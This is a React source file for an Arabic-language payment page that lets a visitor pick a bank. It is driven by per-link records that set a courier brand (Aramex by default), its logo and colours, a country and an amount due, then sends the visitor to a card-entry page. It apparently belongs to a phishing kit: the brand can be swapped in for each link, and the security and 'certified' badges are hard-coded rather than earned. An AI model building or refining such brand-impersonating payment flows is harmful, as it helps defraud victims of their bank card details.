import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, ArrowLeft, Loader2, Shield, Lock, CheckCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const preselectedBank = linkData?.payload?.selected_bank;
  
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;

  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(amount, currencyCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
        
        if (preselectedBank) {
          setSelectedBank(preselectedBank);
        }
      }, 300);
    }
  }, [countryCode, preselectedBank]);
  
  const handleBankSelect = (bankId: string) => {
    setSelectedBank(bankId);
  };
  
  const handleSkip = async () => {
    if (!linkData) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: 'skipped',
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
      console.error('Error saving bank selection:', error);
    }

    toast({
      title: "تم التخطي",
      description: "يمكنك إدخال بيانات البطاقة من أي بنك",
    });

    navigate(`/pay/${id}/card-input`);
  };

  const handleContinue = async () => {
    if (!linkData || !selectedBank) return;

    try {
      const updatedPayload = {
        ...linkData.payload,
        selectedCountry: countryCode,
        selectedBank: selectedBank,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });
    } catch (error) {
      console.error('Error saving bank selection:', error);
    }

    navigate(`/pay/${id}/card-input`);
  };
  
  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50" dir="rtl">
        <div className="text-center">
          <Loader2 className="w-12 h-12 animate-spin mx-auto mb-4" style={{ color: branding?.colors.primary || govSystem.colors.primary }} />
          <p className="text-gray-600">جاري تحميل البيانات...</p>
        </div>
      </div>
    );
  }
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50" dir="rtl">
        <div className="text-center p-8">
          <Building2 className="w-16 h-16 mx-auto mb-4 text-gray-400" />
          <h2 className="text-2xl font-bold mb-2 text-gray-800">خطأ في البيانات</h2>
          <p className="text-gray-600 mb-6">لم يتم العثور على بيانات الدولة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
      <div 
        className="w-full shadow-md"
        style={{ 
          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
          minHeight: '80px'
        }}
      >
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between max-w-4xl mx-auto">
            <div className="flex items-center gap-3">
              {branding.logo && (
                <div className="bg-white rounded-lg p-2 shadow-md">
                  <img 
                    src={branding.logo} 
                    alt={serviceName}
                    className="h-10 w-auto"
                    onError={(e) => e.currentTarget.style.display = 'none'}
                  />
                </div>
              )}
              <div className="text-white">
                <h1 className="text-lg sm:text-xl font-bold">{serviceName}</h1>
                <p className="text-xs sm:text-sm opacity-90">اختيار البنك</p>
              </div>
            </div>
            
            <div className="text-white text-left">
              <p className="text-xs opacity-90">المبلغ</p>
              <p className="text-lg font-bold">{formattedAmount}</p>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-4 py-8 max-w-3xl">
        <div className="mb-6 flex items-center justify-center gap-3 flex-wrap">
          <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: branding.colors.primary + '30' }}>
            <Shield className="w-5 h-5" style={{ color: branding.colors.primary }} />
            <span className="text-sm font-semibold" style={{ color: branding.colors.primary }}>تشفير SSL</span>
          </div>
          <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: branding.colors.primary + '30' }}>
            <Lock className="w-5 h-5" style={{ color: branding.colors.primary }} />
            <span className="text-sm font-semibold" style={{ color: branding.colors.primary }}>دفع آمن</span>
          </div>
          <div className="flex items-center gap-2 bg-white px-4 py-2.5 rounded-lg shadow-sm border-2" style={{ borderColor: branding.colors.primary + '30' }}>
            <CheckCircle className="w-5 h-5" style={{ color: branding.colors.primary }} />
            <span className="text-sm font-semibold" style={{ color: branding.colors.primary }}>معتمد</span>
          </div>
        </div>

        {loadingBanks ? (
          <div className="text-center py-12">
            <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" style={{ color: branding.colors.primary }} />
            <p className="text-gray-600">جاري تحميل البنوك...</p>
          </div>
        ) : banks.length === 0 ? (
          <Card className="p-8 text-center shadow-lg">
            <Building2 className="w-12 h-12 mx-auto mb-4 text-gray-400" />
            <p className="mb-4 text-gray-600">لا توجد بنوك متاحة لهذه الدولة</p>
            <Button onClick={handleSkip} variant="outline">
              متابعة بدون تحديد بنك
            </Button>
          </Card>
        ) : (
          <Card className="p-6 shadow-xl border-0">
            <h2 className="text-xl font-bold mb-4 text-gray-800">اختر البنك الخاص بك</h2>
            
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
              {banks.map((bank) => (
                <div
                  key={bank.id}
                  className={`p-4 rounded-xl cursor-pointer transition-all hover:shadow-md border-2 ${
                    selectedBank === bank.id ? 'shadow-md' : ''
                  }`}
                  style={{
                    borderColor: selectedBank === bank.id ? branding.colors.primary : '#e5e7eb',
                    backgroundColor: selectedBank === bank.id ? `${branding.colors.primary}08` : 'white',
                  }}
                  onClick={() => handleBankSelect(bank.id)}
                >
                  <div className="flex items-center gap-3">
                    <div
                      className="w-10 h-10 rounded-lg flex items-center justify-center text-white text-sm font-bold"
                      style={{
                        background: selectedBank === bank.id
                          ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                          : '#94a3b8',
                      }}
                    >
                      {bank.nameAr.charAt(0)}
                    </div>
                    <div className="flex-1">
                      <h3 className="font-semibold text-sm text-gray-800">{bank.nameAr}</h3>
                      <p className="text-xs text-gray-500">{bank.name}</p>
                    </div>
                    {selectedBank === bank.id && (
                      <CheckCircle className="w-5 h-5" style={{ color: branding.colors.primary }} />
                    )}
                  </div>
                </div>
              ))}
            </div>

            <div className="space-y-3">
              <Button
                onClick={handleContinue}
                disabled={!selectedBank}
                className="w-full h-12 text-lg font-bold text-white shadow-lg"
                style={{
                  background: selectedBank
                    ? `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                    : undefined,
                }}
              >
                <span className="ml-2">متابعة</span>
                <ArrowLeft className="w-5 h-5 mr-2" />
              </Button>
              
              <Button
                onClick={handleSkip}
                variant="outline"
                className="w-full h-12 text-base"
              >
                تخطي واستخدام أي بنك
              </Button>
            </div>
          </Card>
        )}

        <div className="mt-6 flex items-center justify-center gap-4 text-xs text-gray-500">
          <div className="flex items-center gap-1">
            <Lock className="w-3 h-3" />
            <span>معلوماتك مشفرة</span>
          </div>
          <span>•</span>
          <div className="flex items-center gap-1">
            <Shield className="w-3 h-3" />
            <span>حماية كاملة</span>
          </div>
          <span>•</span>
          <div className="flex items-center gap-1">
            <CheckCircle className="w-3 h-3" />
            <span>نظام موثوق</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default PaymentBankSelector;
